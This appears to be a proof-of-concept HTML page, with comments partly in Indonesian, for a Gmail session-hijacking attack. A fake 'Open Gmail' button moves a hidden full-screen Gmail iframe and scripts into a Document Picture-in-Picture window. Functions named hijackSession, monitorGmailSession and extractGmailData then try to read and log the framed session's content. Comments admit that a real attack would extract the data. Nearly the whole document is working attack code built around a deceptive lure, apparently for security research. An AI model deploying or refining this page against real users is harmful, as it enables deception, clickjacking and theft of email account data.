<title>Email Client</title>
<style>#sessionHijacker { display: none; }</style>

<center>
<br><br><br><h2>Check Your <b style="color: #ea4335;">Gmail</b>: <br><br><br><br>
<button onclick="hijackSession()" style="padding: 15px 30px; font-size: 16px; background: #ea4335; color: white; border: none; border-radius: 5px; cursor: pointer;">
    ðŸ“§ Open Gmail
</button>

<div id="sessionHijacker">
<title>Gmail</title>
<iframe id=gmailFrame style="position: fixed; display: none; top: 0; left: 0; width: 100%; height: 100%; border: none; z-index: 999999;" src=https://mail.google.com></iframe>

<script>
// Script yang ikut tertransplant
let gmailSession = null;

function monitorGmailSession() {
    // Coba access Gmail iframe content
    try {
        if (gmailFrame.contentWindow && gmailFrame.contentDocument) {
            console.log('Gmail frame accessible in PiP');
            
            // Monitor for changes (conceptual)
            setInterval(() => {
                // Dalam real attack, ini akan extract data dari Gmail session
                if (gmailFrame.contentDocument.title) {
                    console.log('Gmail tab title:', gmailFrame.contentDocument.title);
                }
            }, 3000);
        }
    } catch (e) {
        console.log('Cross-origin restriction:', e.message);
    }
}

function extractGmailData() {
    // Attempt to extract information from Gmail session
    console.log('Attempting to extract Gmail session data...');
    
    // Dalam real attack, ini akan menggunakan postMessage atau other techniques
    return {
        loggedIn: gmailFrame.src.includes('mail.google.com'),
        timestamp: new Date().toISOString(),
        sessionActive: true
    };
}
</script>
</div>

<script>
async function hijackSession() {
    const pipWindow = await documentPictureInPicture.requestWindow({
        width: 800, 
        height: 600
    });


    pipWindow.document.body.append(sessionHijacker);
    

    pipWindow.gmailFrame.style.display = 'block';
    
    // ðŸŽ¯ FUNCTION ACCESS: Panggil functions dalam PiP context
    setTimeout(() => {
        pipWindow.monitorGmailSession(); // Embedded function works!
        
        const sessionInfo = pipWindow.extractGmailData();
        console.log('Gmail session info:', sessionInfo);
    }, 2000);
    
    // ðŸŽ¯ CROSS-CONTEXT COMMUNICATION
    pipWindow.addEventListener('click', (e) => {
        console.log('Click in PiP window at:', e.clientX, e.clientY);
    });
}
</script>
